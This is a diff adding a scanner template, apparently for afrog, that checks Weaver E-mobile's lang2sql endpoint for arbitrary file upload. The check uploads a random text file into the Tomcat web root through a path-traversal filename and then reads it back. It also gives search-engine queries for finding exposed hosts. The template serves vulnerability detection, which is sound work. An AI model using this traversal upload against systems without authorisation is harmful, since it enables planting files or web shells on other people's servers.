@@ -1,0 +1,40 @@
+id: emobile-lang2sql-fileupload
+
+info:
+  name: 泛微移动管理平台E-mobile lang2sql接口存在任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    fofa: title="移动管理平台-企业管理"
+    zoomeye: app:"泛微移动办公平台e-mobile"
+  reference:
+    - https://mp.weixin.qq.com/s/beQWjJW1pt3vjF3PTvwxLA
+  tags: ecology,emobile,fileuplaod
+  created: 2023/11/07
+
+set:
+  randstr: randomLowercase(6)
+  randbody: randomLowercase(56)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /emp/lang2sql?client_type=1&lang_tag=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"../../../../appsvr/tomcat/webapps/ROOT/{{randstr}}.txt\"\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'"errcode"')
+  r1:
+    request:
+      method: GET
+      path: /{{randstr}}.txt
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
